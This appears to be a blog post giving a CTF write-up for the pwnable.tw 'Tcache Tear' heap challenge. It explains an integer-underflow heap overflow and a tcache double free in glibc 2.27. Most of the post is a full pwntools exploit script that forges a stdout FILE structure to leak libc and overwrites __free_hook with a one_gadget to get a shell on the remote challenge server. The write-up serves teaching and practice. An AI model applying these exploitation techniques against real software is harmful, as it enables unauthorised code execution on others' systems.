---
layout: post
title:  "Pwnable.tw - Tcache Tear"
date:   2025-01-19 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Tcache Tear 

```bash
$ checksec ./tcache_tear
[*] '/home/itay/projects/pwnable_tw/tcache_tear/tcache_tear'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    FORTIFY:    Enabled

$ file ./tcache_tear
./tcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a273b72984b37439fd6e9a64e86d1c2131948f32, stripped

$ strings libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so | grep GNU
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
Compiled by GNU CC version 7.3.0.
```

Cool, 64-bit binary, with almost all mitigations enabled, glibc 2.27. \
This glibc version is pretty old, hence I expect only basic tcache mitigations. 

## Debug

I've downloaded the dbian package, extracted it using glibc-all-in-one, and patched the binary via `patchelf`. 

```bash
wget https://launchpad.net/~adconrad/+archive/ubuntu/staging/+build/14768180/+files/libc6_2.27-3ubuntu1_amd64.deb .
```

## Overview

Menu-based challenge, having the options of `malloc, free, info, exit`. 

1. `main`- Starts by reading a name string into a `.bss` addr, using `read_buf`. Doesn't truncates it. 

2. `read_buf`- reads up to `size` bytes via `FORTIFY_SOURCE`'d version of `read`. There's 1 vuln, that the target buffer isn't initialized. Hence, upon reading less than the buffer's actuall size, uninitialized bytes would remain past `size`. 

3. Reads the option using `read_num` - which reads up to `23` bytes into `24` bytes buffer, and returns `atoll` of the result. There's subtle vulns here too - the buffer isn't initialized, hence the `atoll` result may leak bytes past the inserted input (if the 24'th byte isn't null, for example). Moreover, the usage of `atoll` may come very handy, for example by seting legitimate input as `"1;/bin/sh"` which would get parsed as `1`. 

4. `info_handler` - simply calls `write` on the name buffer. If the name buffer isn't initialized with `0x20` bytes, this may leak pre-existing `.bss` values. Notice that all bytes within the `.bss` are initialized to `0`, hence we would have to play with the program abit in order to leak meaningful data off there.

5. There's a global `ptr`, resides after the name buffer, containing the current allocated chunk address. 

6. Using the `free` option, we can call `free` on the global `ptr` up to `8` times. The tcache size is `7`, so it may be correlated. Vuln - upon `free`, the global pointer isn't invalidated. So there's a UAF for sure, at least a double-free.  

7. The `malloc_handler` is sus - it reads up to `0xff` size, allocates it, and reads content into it. There are few major vulns: incase the allocation fails and `NULL` is returned, the flow continues regularly. Moreover, the returned buffer by `malloc` isn't initialized. Moreover, it reads up to `size - 0x10` bytes into the allocated chunk. But `size` is declared as `signed int` - in case `size < 0x10`, this would wrap around, calling `read_buf` with some extremely large unsigned value as the amount of bytes to read:

```c
printf("Size:");
  usize = read_num();
  size = usize;
  if ( usize <= 0xFF )
  {
    ptr = malloc(usize);
    printf("Data:");
    read_buf((__int64)ptr, size - 16);          // vuln
    LODWORD(usize) = puts("Done !");
  }
  return usize;
```

### Write Primitive

By allocating some small chunk, for example of size `0x8`, a small chunk would be allocated, yet `0xfffffff8` bytes would be attempted to write into it.  
This gives us a strong primitive - linear heap write of arbitrary size. \
For example, the following request:

```python
buf = b'B' * 0x18
malloc(p, 0x8, buf) 
```

Results with the heap overflow:

```bash
pwndbg> x/20gx 0x0000000028076260
0x28076260:     0x4242424242424242      0x4242424242424242
0x28076270:     0x4242424242424242      0x0000000000020d91
0x28076280:     0x0000000000000000      0x0000000000000000
```

The clear candidate to overwrite is the top chunk's size. 
House-of-force is a known technique for similar scenarios - overwriting the top chunk's size to some large value, and performing a very large allocation that would land at our goal address (as the VA space wraps around, and top-chunk is tricked to be seem as max_size). \
However, notice we can only request small chunks. So naive house-of-force won't work here. 

Recall the second vuln wer'e having here - double (or 8-times) free. Apparantely, glibc-2.27 doesn't mitigates double frees on the tcache, which is extremely lame. 
This gives us nearly-trivial arbitrary-write primitive: populate the tcache with 7 (max) slots, all pointing to the same chunk. 
Perform a single allocation, which would corrupt the `next` ptr of the chunk (notice - if we would do 8 allocations, the last one would go into the fastbins). 
This newly-overwrote value would serve as the target address, which would serve as the next allocation. 
By making sure the allocated chunk's size is `< 0x10` (I chose `0x8` for alignment), we would have unlimited write amount to this goal address. 
This means we're having arbitrary-write of arbitrary-data primitive, which is 99% win:

```bash
pwndbg> x/20gx 0x602060 - 0x20
0x602040 <stderr>:      0x0000741b36fec680      0x0000000000000000
0x602050:       0x0000000000000000      0x0000000000000000
0x602060:       0x4343434343434343      0x4141414141414141
0x602070:       0x4141414141414141      0x4141414141414141
0x602080:       0x0000000000000000      0x0000000000602060
```

We can easily overwrite the `ptr` value. \
Notice, that we can also perform some funny trick - cause a fake allocation near the `.bss` pointers of the file streams, such that the next allocations would be performed on libc!

### Read Primitive

Having arbitrary write of arbitrary data, we're nearly done. \
Notice there's an interesting handler, that leaks `0x20` bytes starting from the `name` buffer. 
If we can store there our leak somehow, its a win. \
My main goal is a libc leakage. There are file stream pointers resides on the `.bss`, and many function pointers within the GOT. 
Hence, my funny idea is to overwrite `stdout` file stream, such that we'd overwrite its `write_base` to arbitrary address, hence obtaining arbitrary read primitive. 
Leaking a GOT address is enough for my needs of libc leakage. 

## Solution

```python
#!/usr/bin/python3

from pwn import *
from time import gmtime, strftime


HOST = 'chall.pwnable.tw'
PORT = 10207
context.arch='amd64'
BINARY = './tcache_tear'
LIBC = './libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so'
LD = './ld-2.27.so'

GDB_SCRIPT = '''

# b *0x400b99
# commands
#     p "in info handler. Name buf:"
#     x/20gx 0x602060
# end

b *0x400b84
commands
    p "gonna write to chunk"
end

ignore 1 4

c
'''

def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def chunkSize(alloc_size):
    assert(alloc_size >= 0)
    min_size = alloc_size + SIZEOF_PTR
    res = min_size % (2 * SIZEOF_PTR)
    pad = (2 * SIZEOF_PTR) - res if res else 0
    return min_size + pad

def allocSize(chunkSize):
    assert((chunkSize & 0xf) == 0)
    return chunkSize - SIZEOF_PTR

def recvPointer(p):
    leak = p.recv(SIZEOF_PTR)
    assert(len(leak) == SIZEOF_PTR)
    if SIZEOF_PTR == 4:
        leak = u32(leak)
    else:
        leak = u64(leak)
    assert(leak > 0x10000)
    return leak

def time_now():
    log.info(strftime("%Y-%m-%d %H:%M:%S", gmtime()))

###### Constants ######
IS_DEBUG = False 
IS_REMOTE = True 
SIZEOF_PTR = 8

###### Offsets ######

###### Addresses ######
binary = ELF(BINARY)
puts_got = binary.got['puts']
puts_plt = binary.plt['puts']
atoll_got = binary.got['atoll']
printf_got = binary.got['printf']
printf_plt = binary.plt['printf']
free_got = binary.got['free']
binary_stdout = binary.symbols['stdout']

libc = ELF(LIBC)
bin_sh_libc = next(libc.search(b'/bin/sh'))
free_libc = libc.symbols['free']
system_libc = libc.symbols['system']
puts_libc = libc.symbols['puts']
environ_libc = libc.symbols['environ']
realloc_hook = libc.symbols['__realloc_hook'] 
free_hook = libc.symbols['__free_hook']

libc_rop = ROP(LIBC)
# pop_eax_ret = libc_rop.eax.address
# pop_ebx_ret = libc_rop.ebx.address
# pop_ecx_ret = libc_rop.ecx.address
# pop_edx_ret = libc_rop.edx.address
# leave_ret = libc_rop.find_gadget(['leave']).address
# int_80 = libc_rop.find_gadget(['int 0x80']).address
# log.info(f'pop_eax_ret: {hex(pop_eax_ret)}')
# log.info(f'pop_ebx_ret: {hex(pop_ebx_ret)}')
# log.info(f'pop_ecx_ret: {hex(pop_ecx_ret)}')
# log.info(f'pop_edx_ret: {hex(pop_edx_ret)}')
# log.info(f'leave_ret: {hex(leave_ret)}')
# log.info(f'int_80: {hex(int_80)}')

####### Exploit #######
def send_name(p, name):
    p.recvuntil(b'Name:')
    p.send(name)
    p.recvuntil(b'Your choice :')

def info(p):
    p.sendline(b'3')
    p.recvuntil(b'Your choice :')

def free(p, to_flush=True):
    p.sendline(b'2')
    if to_flush:
        p.recvuntil(b'Your choice :')

def malloc(p, size, data, to_flush=True):
    p.sendline(b'1')
    p.recvuntil(b'Size:')
    p.sendline(str(size).encode())
    p.recvuntil(b'Data:')
    p.send(data)
    if to_flush:
        p.recvuntil(b'Your choice :')

def arbitrary_write(p, addr, data, size_class, debug=False):
    log.info(b'Allocate chunk to be doubly-freed')
    malloc(p, size_class, b'A') 

    log.info(b"Populate tcache using the double-free vuln, as glibc-2.27 doesn't mitigates this.")
    for _ in range(2):
        free(p)

    log.info(b"Overwrite 'next' to target address")
    buf = p64(addr)
    malloc(p, size_class, buf) 

    log.info(b'Consume head')
    malloc(p, size_class, buf) 

    log.info(b'Perform write at target address')
    malloc(p, size_class, data)
    # Integer-overflow - allocate chunk of size class 0x8, potentially writing unlimited content past it.

def arbitrary_read(p, addr, size, size_class):
    ''' Overwrites the stdout file stream, corrupting the required internal buffer pointers.
    This function leaks [mem[addr], ..., mem[addr + size])
    '''
    # Overwrite the stdout file stream
    fake_stream = p64(0xfbad1802)
    fake_stream += p64(0)  # read_ptr
    fake_stream += p64(addr)  # read_end
    fake_stream += p64(0)  # read_base
    fake_stream += p64(addr)  # write_base
    fake_stream += p64(addr + size)  # write_ptr
    fake_stream += p64(0)  # write_end
    fake_stream += p64(0)  # buf_base
    fake_stream += p64(0)  # buf_end
    malloc(p, size_class, fake_stream, to_flush=False)
    leak = p.recv(size)
    p.recvuntil(b'Your choice :')
    return leak

def exploit(p):
    time_now()
    name = b'A' * 0x20
    send_name(p, name)

    # Allocate a chunk near the stdout .bss pointer, 
    # such that the allocator would be tricked to think stdout is the 'next' pointer! Then we would be able to write into it
    # Just preserve LSB of stdout. 
    arbitrary_write(p, binary_stdout, b'\x60', 0x8)
    libc_leak = u64(arbitrary_read(p, free_got, 8, 0x8))
    libc_base = libc_leak - free_libc
    log.info(f'libc_base: {hex(libc_base)}')
    assert((libc_base & 0xfff) == 0)
    
    one_gadget = 0x4f322 + libc_base
    libc_free_hook = free_hook + libc_base
    arbitrary_write(p, libc_free_hook, p64(one_gadget), 0x28, debug=True)

    log.info(b'Triggering __free_hook..')
    free(p, to_flush=False)

def main_internal():
    if IS_DEBUG:
        with gdb.debug(BINARY, gdbscript=GDB_SCRIPT) as p:
            exploit(p)
            log.info('Win')
            time_now()
            p.interactive()
    else:
        if IS_REMOTE:
            with remote(HOST, PORT) as p:
                exploit(p)
                log.info('Win')
                time_now()
                p.interactive()
        else:
            with process(BINARY) as p:
                exploit(p)
                log.info('Win')
                time_now()
                p.interactive()

def main():
    if True:
        try:
            main_internal()
        except Exception as e:
            log.info(f'Got: {e}')

if __name__ == '__main__':
    main()
```

The coolest lesson from this challenge is to use the arbitrary-allocate primitive such that a chunk's metadata (`next, fd, bk`) would land on an existing interesting pointer. 
In this case, the `.bss` pointers of `stdout`. This gave us a libc-write primitive, without any leakage.
Notice that we don't actually need a libc leakage for arbitarry write. Because we can directly write into the `.bss`, we would overwrite any LSBs of the `stdout` pointer, hence - writing to any address of libc we wish. 
For example, writing at `__free_hook` would require overwriting 2 LSBs, hence 1 nibble brute-force (1/16) - which is very cool, as we could also pwn this without any read primitive.

I'm pretty sure my solution isn't the intended one though, as I haven't used the `info_handler` menu option at all. \
After reading few writeups, I've seen that many solvers have used the arbitrary-allocate primitive to forge a fake chunk at `name` address, such that its size wouldn't match to the tcachebins (`> 0x410`). 
This way, upon freeing that fake chunk, it would go to the unsortedbin, leaving `fd, bk` pointers there - which may be leaked via the third menu option. \
Still, I find my solution nicer, as it requires less from the program, and implements a full arbitrary-read primtive :)
